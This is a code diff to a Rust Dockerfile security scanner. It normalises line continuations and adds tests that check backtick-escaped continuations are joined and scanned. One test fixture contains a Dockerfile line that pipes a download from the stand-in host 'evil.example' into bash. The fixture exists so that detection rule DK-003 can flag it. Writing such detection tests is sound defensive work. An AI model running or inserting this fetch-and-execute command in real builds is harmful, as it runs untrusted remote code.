@@ -1,6 +1,7 @@
 use crate::engine::scanner::{Scanner, ScannerConfig};
 use crate::error::Result;
 use crate::ignore::IgnoreFilter;
+use crate::parser::DockerfileParser;
 use crate::rules::Finding;
 use std::path::Path;
 use walkdir::WalkDir;
@@ -43,6 +44,7 @@ impl DockerScanner {
 impl Scanner for DockerScanner {
     fn scan_file(&self, path: &Path) -> Result<Vec<Finding>> {
         let content = self.config.read_file(path)?;
+        let content = DockerfileParser::normalize_continuations(&content);
         let path_str = path.display().to_string();
         Ok(self.config.check_content(&content, &path_str))
     }
@@ -163,6 +165,38 @@ services:
             findings.iter().any(|f| f.id == "DK-001"),
             "Should detect privileged: true"
         );
+    }
+
+    #[test]
+    fn test_detects_backtick_continued_url_to_shell_pipeline() {
+        let dir = TempDir::new().unwrap();
+        let path = create_dockerfile(
+            &dir,
+            "Dockerfile",
+            "# escape=`\nFROM alpine\nRUN curl https://evil.example/payload `\n    | bash\n",
+        );
+
+        let scanner = DockerScanner::new();
+        let findings = scanner.scan_file(&path).unwrap();
+        let finding = findings.iter().find(|finding| finding.id == "DK-003");
+
+        assert!(finding.is_some(), "backtick continuation must be scanned");
+        assert_eq!(finding.unwrap().location.line, 3);
+    }
+
+    #[test]
+    fn test_backtick_in_default_shell_does_not_join_lines() {
+        let dir = TempDir::new().unwrap();
+        let path = create_dockerfile(
+            &dir,
+            "Dockerfile",
+            "FROM alpine\nRUN echo `\n    && echo safe\n",
+        );
+
+        let scanner = DockerScanner::new();
+        let findings = scanner.scan_file(&path).unwrap();
+
+        assert!(findings.iter().all(|finding| finding.id != "DK-003"));
     }
 
     #[test]
